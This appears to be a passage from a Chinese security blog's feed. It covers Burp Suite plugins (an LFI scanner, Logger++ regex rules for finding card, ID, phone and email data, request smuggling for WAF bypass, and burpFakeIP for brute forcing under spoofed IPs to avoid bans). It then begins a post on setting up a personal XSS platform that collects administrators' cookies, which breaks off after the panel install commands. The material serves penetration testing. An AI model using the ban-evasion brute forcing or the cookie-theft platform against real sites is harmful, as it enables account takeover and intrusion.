检测本地文件包含漏洞的，LFI scanner checks插件 lufei  写的，freebuf  上有介绍<a href="https://www.freebuf.com/sectool/75118.html" target="_blank" rel="noopener">传送门</a></p><h2 id="13-2-下载"><a href="#13-2-下载" class="headerlink" title="13.2 下载"></a>13.2 下载</h2><blockquote><p>链接: <a href="http://pan.baidu.com/s/1gdfITIN" target="_blank" rel="noopener">http://pan.baidu.com/s/1gdfITIN</a> 密码: 4fv7</p></blockquote><h2 id="13-3-安装"><a href="#13-3-安装" class="headerlink" title="13.3 安装"></a>13.3 安装</h2><p>在burp extender模块加载插件 ，与之前的插件安装类似，将下载来下的插件jar包复制到burpsuite的插件文件夹中，然后再burp suite的extender模块去导入jar包即可。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160627.png" class="lozad"></p><h2 id="13-4-使用"><a href="#13-4-使用" class="headerlink" title="13.4 使用"></a>13.4 使用</h2><p>访问漏洞页面，burp 抓包，发送到主动扫描</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160731.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160745.png" class="lozad"></p><p>PAYLOAD:</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160809.png" class="lozad"></p><p>扫描结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160829.png" class="lozad"></p><h1 id="0x14-logger"><a href="#0x14-logger" class="headerlink" title="0x14 logger++"></a>0x14 logger++</h1><h2 id="14-1-介绍"><a href="#14-1-介绍" class="headerlink" title="14.1 介绍"></a>14.1 介绍</h2><p>跟 http history 差不过，记录的更加全面了，字段也多了几个</p><h2 id="14-2-下载"><a href="#14-2-下载" class="headerlink" title="14.2 下载"></a>14.2 下载</h2><blockquote><p><a href="https://github.com/nccgroup/BurpSuiteLoggerPlusPlus" target="_blank" rel="noopener">https://github.com/nccgroup/BurpSuiteLoggerPlusPlus</a></p></blockquote><h2 id="14-3-安装"><a href="#14-3-安装" class="headerlink" title="14.3 安装"></a>14.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015161137.png" class="lozad"></p><h2 id="14-4-使用"><a href="#14-4-使用" class="headerlink" title="14.4 使用"></a>14.4 使用</h2><p>正常开代理就行，不用管，跟 http history 一样<br>下图是 logger 和 burp 自带的对比</p><p>【burp history】</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015161500.png" class="lozad"></p><p>【logger++】</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015161530.png" class="lozad"></p><p>【功能介绍】</p><ol><li>View logs</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162358.png" class="lozad"></p><ol start="2"><li>过滤器使用</li></ol><p>在过滤器空白处鼠标右键，会出现你要用匹配的位置，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162458.png" class="lozad"></p><p>比如返回包的 body</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162713.png" class="lozad"></p><ol start="3"><li>Grep values</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162739.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162812.png" class="lozad"></p><ol start="4"><li>Filter library</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015163025.png" class="lozad"></p><p>比如我随便找一个匹配邮箱的正则，放进去。之后点击 set as logfilter</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015163052.png" class="lozad"></p><p>点击跳转了，进行匹配</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015163111.png" class="lozad"></p><ol start="5"><li>Options</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015163134.png" class="lozad"></p><h2 id="14-5-规则库"><a href="#14-5-规则库" class="headerlink" title="14.5 规则库"></a>14.5 规则库</h2><ol><li>JSON帖子响应中的卡号</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Headers == &quot;post&quot; &amp;&amp; Response.MimeType == &quot;json&quot; &amp;&amp; Response.Body == &quot;/(?:4[0-9]&#123;12&#125;(?:[0-9]&#123;3&#125;)?|(?:5[1-5][0-9]&#123;2&#125;|222[1-9]|22[3-9][0-9]|2[3-6][0-9]&#123;2&#125;|27[01][0-9]|2720)[0-9]&#123;12&#125;|3[47][0-9]&#123;13&#125;|3(?:0[0-5]|[68][0-9])[0-9]&#123;11&#125;|6(?:011|5[0-9]&#123;2&#125;)[0-9]&#123;12&#125;|(?:2131|1800|35d&#123;3&#125;)d&#123;11&#125;)/&quot;</span><br></pre></td></tr></table></figure><ol start="2"><li><h3 id="敏感信息内网IP"><a href="#敏感信息内网IP" class="headerlink" title="敏感信息内网IP"></a>敏感信息内网IP</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Body == &quot;/(10(.(25[0-5]|2[0-4][0-9]|1[0-9]&#123;1,2&#125;|[0-9]&#123;1,2&#125;))&#123;3&#125;|((172.(1[6-9]|2[0-9]|3[01]))|192.168)(.(25[0-5]|2[0-4][0-9]|1[0-9]&#123;1,2&#125;|[0-9]&#123;1,2&#125;))&#123;2&#125;)/&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>常规IP地址（包括外网）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(?:(?:^|\.)(?:2(?:5[0-5]|[0-4]\d)|1?\d?\d))&#123;4&#125;/</span><br></pre></td></tr></table></figure><ol start="4"><li><h3 id="敏感信息手机号"><a href="#敏感信息手机号" class="headerlink" title="敏感信息手机号"></a>敏感信息手机号</h3><p>手机号（存在单词边界）</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /\b(1[3-9](\d&#123;9&#125;))\b/</span><br></pre></td></tr></table></figure><p>​                手机号（误报多）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(1[3-9](\d&#123;9&#125;))/</span><br></pre></td></tr></table></figure><ol start="5"><li><h3 id="敏感信息电子邮件"><a href="#敏感信息电子邮件" class="headerlink" title="敏感信息电子邮件"></a>敏感信息电子邮件</h3><p>通用电子邮件地址匹配</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]&#123;2,4&#125;))/</span><br></pre></td></tr></table></figure><p>​                 匹配特定邮箱    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(([A-Za-z0-9_\-\.])+\@example.com)/</span><br></pre></td></tr></table></figure><p>​                 模糊匹配关键字邮箱</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(([A-Za-z0-9_\-\.])+\@(.*)example(.*))/</span><br></pre></td></tr></table></figure><ol start="5"><li><h3 id="敏感信息身份证号"><a href="#敏感信息身份证号" class="headerlink" title="敏感信息身份证号"></a>敏感信息身份证号</h3><p>身份证号</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 简易正则</span><br><span class="line">RESPONSE == /((\d&#123;6&#125;)(18|19|20)?(\d&#123;2&#125;)([01]\d)([0123]\d)(\d&#123;3&#125;)(\d|X))/</span><br><span class="line"></span><br><span class="line"># 出现图片误报</span><br><span class="line">RESPONSE == /((\d&#123;6&#125;)(18|19|20)?(\d&#123;2&#125;)([01]\d)([0123]\d)(\d&#123;3&#125;)(\d|X))/ &amp;&amp; MIMETYPE != &quot;jpeg&quot;</span><br></pre></td></tr></table></figure><ol start="6"><li><h3 id="潜在的CORS配置不当"><a href="#潜在的CORS配置不当" class="headerlink" title="潜在的CORS配置不当"></a>潜在的CORS配置不当</h3><p>具有允许凭证＃1的空CORS响应</p><p>CORS响应头为空＃1</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Headers == &quot;/Access-Control-Allow-Origin: null/&quot;</span><br></pre></td></tr></table></figure><p>​                具有允许凭证＃2的空CORS响应</p><p>​                CORS响应头为空＃2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Headers == &quot;Access-Control-Allow-Origin: */&quot;</span><br></pre></td></tr></table></figure><ol start="7"><li><h3 id="点击劫持（Clickjacking）"><a href="#点击劫持（Clickjacking）" class="headerlink" title="点击劫持（Clickjacking）"></a>点击劫持（Clickjacking）</h3><p>缺少X帧选项</p><p>通用X-FRAME-OPTIONS响应头</p><p><a href="https://tools.ietf.org/html/rfc7034" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7034</a></p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Headers != &quot;/X-FRAME-OPTIONS/ &quot;</span><br></pre></td></tr></table></figure><p>​                缺少内容安全政策</p><p>​                国会CSP响应头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSEHEADERS != /Content-Security-Policy/</span><br></pre></td></tr></table></figure><p>​                内容安全策略头中主要是与<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors" target="_blank" rel="noopener">frame-ancestors</a>相关的细分</p><ol start="8"><li><h3 id="寻找潜在的SSRF-开放重定向"><a href="#寻找潜在的SSRF-开放重定向" class="headerlink" title="寻找潜在的SSRF /开放重定向"></a>寻找潜在的SSRF /开放重定向</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 根据响应头</span><br><span class="line">Response.Headers == &quot;(Location)&quot;</span><br><span class="line"></span><br><span class="line"># 根据参数名称</span><br><span class="line">Request.Query == &quot;(url(.*)=)&quot; || Request.URL == &quot;(url(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(uri(.*)=)&quot; || Request.URL == &quot;(uri(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(path(.*)=)&quot; || Request.URL == &quot;(path(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(href(.*)=)&quot; || Request.URL == &quot;(href(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(redirect(.*)=)&quot; || Request.URL == &quot;(redirect(.*)=)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 寻找参数中的图片</span><br><span class="line">Request.Query == &quot;(img(.*)=)&quot; ||  Request.HasParams == &quot;(img(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(pic(.*)=)&quot; || Request.HasParams == &quot;(pic(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(\.png)&quot; || Request.HasParams == &quot;(\.png)&quot;</span><br><span class="line">|| Request.Query == &quot;(\.jpg)&quot; || Request.HasParams== &quot;(\.jpg)&quot;</span><br><span class="line">|| Request.Query == &quot;(\.gif)&quot; || Request.HasParams == &quot;(\.gif)&quot;</span><br></pre></td></tr></table></figure><ol start="9"><li><h3 id="JSONP调用"><a href="#JSONP调用" class="headerlink" title="JSONP调用"></a>JSONP调用</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 基于参数</span><br><span class="line">Request.HasParams == &quot;(callback(.*)=)&quot; || Request.Query == &quot;(callback(.*)=)&quot; || Request.HasGetParam == &quot;(callback(.*)=)&quot; || Request.HasPostParam == &quot;(callback(.*)=)&quot;</span><br><span class="line"></span><br><span class="line"># 基于响应特征</span><br><span class="line">HTTP记录量大时容易长耗时</span><br><span class="line">Response.Headers == &quot;(.+\(\[(.*)\]\))&quot; &amp;&amp; Response.Headers == &quot;application\&quot;json&quot;</span><br></pre></td></tr></table></figure><ol start="10"><li><h3 id="寻找潜在的XXE"><a href="#寻找潜在的XXE" class="headerlink" title="寻找潜在的XXE"></a>寻找潜在的XXE</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 根据 content-type</span><br><span class="line">Request.Headers == &quot;application\&quot;xml&quot; || Request.Headers == &quot;text\&quot;xml&quot; ||</span><br><span class="line">Request.Headers == &quot;Content-Type: application\&quot;xml&quot;</span><br><span class="line"></span><br><span class="line"># 根据 POST 参数</span><br><span class="line">Request.HasPostParam == &quot;&lt;\?xml version=&quot;1\.&quot;</span><br></pre></td></tr></table></figure><ol start="11"><li><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /ueditor/</span><br></pre></td></tr></table></figure><ol start="12"><li><h3 id="RPO相对路径重构"><a href="#RPO相对路径重构" class="headerlink" title="RPO相对路径重构"></a>RPO相对路径重构</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /=\.\.\//</span><br></pre></td></tr></table></figure><ol start="13"><li><h3 id="潜在越权点"><a href="#潜在越权点" class="headerlink" title="潜在越权点"></a>潜在越权点</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 基于参数名称</span><br><span class="line">Request.HasParams == &quot;(_id(.*)=)&quot; || Request.Query == &quot;(_id(.*)=)&quot; ||</span><br><span class="line">Request.HasParams == &quot;(id(.*)=)&quot; || Request.Query == &quot;(id(.*)=)&quot; ||</span><br><span class="line">Request.HasParams == &quot;((I|i)(D|d)(.*)=)&quot; || Request.Query == &quot;((I|i)(D|d)(.*)=)&quot;</span><br></pre></td></tr></table></figure><ol start="14"><li><h3 id="其他敏感参数"><a href="#其他敏感参数" class="headerlink" title="其他敏感参数"></a>其他敏感参数</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Request.Query == &quot;(sql(.*)=)&quot; || Request.Headers == &quot;(sql(.*)=)&quot; ||</span><br><span class="line">Request.Query == &quot;(exec(.*)=)&quot; || Request.Headers == &quot;(exec(.*)=)&quot; ||</span><br><span class="line">Request.Query == &quot;(script(.*)=)&quot; || Request.Headers == &quot;(script(.*)=)&quot; ||</span><br><span class="line">Request.Query == &quot;(src(.*)=)&quot; || Request.Headers == &quot;(src(.*)=)&quot;</span><br></pre></td></tr></table></figure><blockquote><p>logger++规则库参考链接：</p><p><a href="https://www.itcodemonkey.com/article/14521.html" target="_blank" rel="noopener">https://www.itcodemonkey.com/article/14521.html</a></p><p><a href="http://wp.blkstone.me/2019/04/burp-suite-logger-filter-rules/" target="_blank" rel="noopener">http://wp.blkstone.me/2019/04/burp-suite-logger-filter-rules/</a></p></blockquote><h1 id="0x15-HTTPS-muggler"><a href="#0x15-HTTPS-muggler" class="headerlink" title="0x15 HTTPS-muggler"></a>0x15 <strong>HTTPS-muggler</strong></h1><h2 id="15-1-介绍"><a href="#15-1-介绍" class="headerlink" title="15.1 介绍"></a>15.1 介绍</h2><p>Burp Suite扩展，可帮助渗透测试人员使用多种技术绕过WAF或测试其有效性</p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></p><h2 id="15-2-下载"><a href="#15-2-下载" class="headerlink" title="15.2 下载"></a>15.2 下载</h2><blockquote><p><a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler/releases" target="_blank" rel="noopener">https://github.com/nccgroup/BurpSuiteHTTPSmuggler/releases</a></p></blockquote><h2 id="15-3-安装"><a href="#15-3-安装" class="headerlink" title="15.3 安装"></a>15.3 安装</h2><p>在burp extender模块加载插件 ，与之前的插件安装类似，将下载来下的插件jar包复制到burpsuite的插件文件夹中，然后再burp suite的extender模块去导入jar包即可。</p><h2 id="15-4-使用"><a href="#15-4-使用" class="headerlink" title="15.4 使用"></a>15.4 使用</h2><p><img alt="AppSec EU 18-example1" data-src="https://github.com/nccgroup/BurpSuiteHTTPSmuggler/raw/master/screenshots/AppSecEU18-example1.jpg?raw=true" class="lozad"></p><p><img alt="AppSec EU 18-example2" data-src="https://github.com/nccgroup/BurpSuiteHTTPSmuggler/raw/master/screenshots/AppSecEU18-example2.jpg?raw=true" class="lozad"></p><h1 id="0x16-Passive-Scan-Client"><a href="#0x16-Passive-Scan-Client" class="headerlink" title="0x16 Passive Scan Client"></a>0x16 Passive Scan Client</h1><h2 id="16-1-介绍"><a href="#16-1-介绍" class="headerlink" title="16.1 介绍"></a>16.1 介绍</h2><p>被动扫描流量转发插件</p><h2 id="16-2-下载"><a href="#16-2-下载" class="headerlink" title="16.2 下载"></a>16.2 下载</h2><blockquote><p><a href="https://github.com/c0ny1/passive-scan-client" target="_blank" rel="noopener">https://github.com/c0ny1/passive-scan-client</a></p></blockquote><h2 id="16-3-安装"><a href="#16-3-安装" class="headerlink" title="16.3 安装"></a>16.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185322.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185334.png" class="lozad"></p><h2 id="16-4-使用"><a href="#16-4-使用" class="headerlink" title="16.4 使用"></a>16.4 使用</h2><ol><li>访问靶机，点击插件的 run  就可以了</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185402.png" class="lozad"></p><ol start="2"><li><p>结合被动扫描插件使用</p><p>a.开启插件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185505.png" class="lozad"></p><p>b. 选择一个扫描器，我这里用的长亭的，将代理设置为插件的地址和端口</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185520.png" class="lozad"></p><p>c.访问网站</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185545.png" class="lozad"></p><blockquote><p>ps:扫描器可自行选择</p></blockquote></li></ol><h1 id="0x17-burpFakeIP"><a href="#0x17-burpFakeIP" class="headerlink" title="0x17 burpFakeIP"></a>0x17 <strong>burpFakeIP</strong></h1><h2 id="17-1-介绍"><a href="#17-1-介绍" class="headerlink" title="17.1 介绍"></a>17.1 介绍</h2><p>burpFakeIP是一个可以伪造IP的插件，在渗透测试的过程中，通常可能会对某个参数进行爆破，但是却很容易被封ip，所以可以通过这款插件来配合爆破，效果极佳。</p><h2 id="17-2-下载"><a href="#17-2-下载" class="headerlink" title="17.2 下载"></a>17.2 下载</h2><blockquote><p><a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/burpFakeIP</a></p></blockquote><h2 id="17-3-安装"><a href="#17-3-安装" class="headerlink" title="17.3 安装"></a>17.3 安装</h2><p>需要选择python</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191018160450.png" class="lozad"></p><h2 id="17-4-使用"><a href="#17-4-使用" class="headerlink" title="17.4 使用"></a>17.4 使用</h2><p>4个小功能</p><ul><li>伪造指定ip</li><li>伪造本地ip</li><li>伪造随机ip</li><li>随机ip爆破</li></ul><h3 id="17-4-1-伪造指定ip"><a href="#17-4-1-伪造指定ip" class="headerlink" title="17.4.1 伪造指定ip"></a>17.4.1 伪造指定ip</h3><p>在<code>Repeater</code>模块右键选择<code>fakeIp</code>菜单,然后点击<code>inputIP</code>功能,然后输入指定的ip：</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597184839805.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597184839805.png" class="lozad"></a></p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597185444300.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597185444300.png" class="lozad"></a></p><p>程序会自动添加所有可伪造得字段到请求头中。</p><h3 id="17-4-2-伪造本地ip"><a href="#17-4-2-伪造本地ip" class="headerlink" title="17.4.2 伪造本地ip"></a>17.4.2 伪造本地ip</h3><p>在<code>Repeater</code>模块右键选择<code>fakeIp</code>菜单,然后点击<code>127.0.0.1</code>功能：</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597186627939.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597186627939.png" class="lozad"></a></p><h3 id="17-4-3-伪造随机ip"><a href="#17-4-3-伪造随机ip" class="headerlink" title="17.4.3 伪造随机ip"></a>17.4.3 伪造随机ip</h3><p>在<code>Repeater</code>模块右键选择<code>fakeIp</code>菜单,然后点击<code>randomIP</code>功能：</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597187304576.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597187304576.png" class="lozad"></a></p><h3 id="17-4-4-随机ip爆破"><a href="#17-4-4-随机ip爆破" class="headerlink" title="17.4.4 随机ip爆破"></a>17.4.4 随机ip爆破</h3><p><strong>伪造随机ip爆破是本插件最核心的功能。</strong></p><p>将数据包发送到<code>Intruder</code>模块,在<code>Positions</code>中切换<code>Attack type</code>为<code>Pitchfork</code>模式,选择好有效的伪造字段,以及需要爆破的字段:</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597190596991.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597190596991.png" class="lozad"></a></p><p>按照箭头顺序将Payload来源设置为<code>Extensin-generated</code>,并设置负载伪<code>fakeIpPayloads</code>,然后设置第二个变量。 <a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597191239161.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597191239161.png" class="lozad"></a></p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597192426317.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597192426317.png" class="lozad"></a></p><p>点击<code>Start attack</code>开始爆破.</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597193222287.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597193222287.png" class="lozad"></a></p><p>如上图,实现每次爆破都使用不同的伪ip进行,避免被ban。</p><blockquote><p>PS：伪造随机ip爆破的先决条件可以伪造ip绕过服务器限制。</p></blockquote><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;做安全的人都知道，burpsuite是安全从业者必须要会使用的神器，之所以称之为神器，是因为他不仅功能强大，好用，界面美观，还有丰富的插件拓展功能，支持python和java写的插件，用户可以在插件商城中去安装，有代码编写能力的，还可以自己编写插件。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://i03piccdn.sogoucdn.com/b0a2a870df891caa&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="burpsuite" scheme="https://www.mad-coding.cn/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>XSS平台的搭建</title>
    <link href="https://www.mad-coding.cn/2019/09/29/XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://www.mad-coding.cn/2019/09/29/XSS平台的搭建/</id>
    <published>2019-09-28T16:12:53.000Z</published>
    <updated>2019-10-28T08:59:04.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    XSS——跨站脚本攻击，是一个主流的web安全漏洞，主要分为反射型、存储型和DOM型。攻击者可以利用XSS漏洞获取管理员的cookie信息，然后使用该cookie信息登陆到系统后台，从而进一步攻破系统。而打管理员cookie信息的平台就叫XSS平台，晚上也有很多搭建好的，虽然也能注册使用，但是你打到的cookie别人也能看到，这样的话，总感觉不安全，所以就自己搭建了一个平台自己使用，哈哈哈。</p><a id="more"></a><h1 id="0x01-环境需求"><a href="#0x01-环境需求" class="headerlink" title="0x01 环境需求"></a>0x01 环境需求</h1><blockquote><p>vps：1G 512M即可 <a href="[https://billing.virmach.com](https://billing.virmach.com/)">传送门</a></p><p>域名：<a href="https://dnspod.cloud.tencent.com/" target="_blank" rel="noopener">腾讯云</a>  <a href="https://wanwang.aliyun.com/" target="_blank" rel="noopener">阿里云</a></p><p>宝塔面板</p><p>PHP 7版本</p><p>XSS平台源码 </p></blockquote><h1 id="0x02-vps购买"><a href="#0x02-vps购买" class="headerlink" title="0x02 vps购买"></a>0x02 vps购买</h1><p>可参考<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/#0x01-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/#0x01-环境准备)">https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/</a></p><h1 id="0x03-域名购买"><a href="#0x03-域名购买" class="headerlink" title="0x03 域名购买"></a>0x03 域名购买</h1><p>可参考[<a href="https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/">https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/</a></p><h1 id="0x04-宝塔面板的安装"><a href="#0x04-宝塔面板的安装" class="headerlink" title="0x04 宝塔面板的安装"></a>0x04 宝塔面板的安装</h1><p>大家根据自己的vps系统选择对应的安装脚本命令，一件之行安装，非常方便</p><p><strong>entos**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><p><strong>Ubuntu/Deepin**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Debian**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Fedora**</strong>安装命令<strong>**:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><h2 id="LNMP环境的安装"><a href="#LNMP环境的安装" class="headerlink" title="LNMP环境的安装"></a>LNMP环境的安装</h2><p>输入你的vps IP:8888宝塔面板后台，然后会弹出让你选择安装LAMP环境还是LNMP环境，我使用的是LNMP环境，记住PHP版本需要使用7版本以上。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190929003418.png" class="lozad"></p><h1 